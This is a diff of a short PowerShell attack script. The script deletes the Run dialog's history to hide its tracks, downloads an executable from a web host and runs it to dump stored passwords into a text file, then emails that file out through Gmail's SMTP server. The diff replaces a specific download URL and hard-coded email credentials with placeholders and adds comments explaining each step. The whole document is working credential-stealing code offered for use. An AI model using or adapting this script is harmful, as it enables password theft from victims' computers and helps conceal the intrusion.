@@ -1,6 +1,11 @@
+    #This script downloads and execute an executable that fetches the stored passwords
+    #The output of the executable is directed to a text file "p.txt"
+    #Lines 13 - 31 send and email to the desired address with p.txt as attachment.
+    #First command is to ensure there are no tracks left behind (run dialog's recently executed commands)
+    
     RP 'HKCU:\S*\M*\W*\C*\E*\RunMRU' '*' -ErrorA Si
     cd\
-    $i="https://coolguyisback.000webhostapp.com/wp1.exe"
+    $i="LINK_TO_THE_EXECUTABLE_HERE"
     $o="C:\wp1.exe" 
     $d=New-Object System.Net.WebClient
     $d.DownloadFile($i, $o)
@@ -8,9 +13,9 @@
     ./wp1.exe > p.txt
     $SMTPServer = "smtp.gmail.com"
     $SMTPPort = "587"
-    $Username = "coolguyisbackk@gmail.com"
-    $Password = "HACKthis123"
-    $to = "coolguyisbackk@gmail.com"
+    $Username = "YOUR_EMAIL_ADDRESS"
+    $Password = "YOUR_PASSWORD"
+    $to = "TO_EMAIL_ADDRESS"
     $subject = "Passwords"
     $body = ":)"
     $attachment = "C:\p.txt"
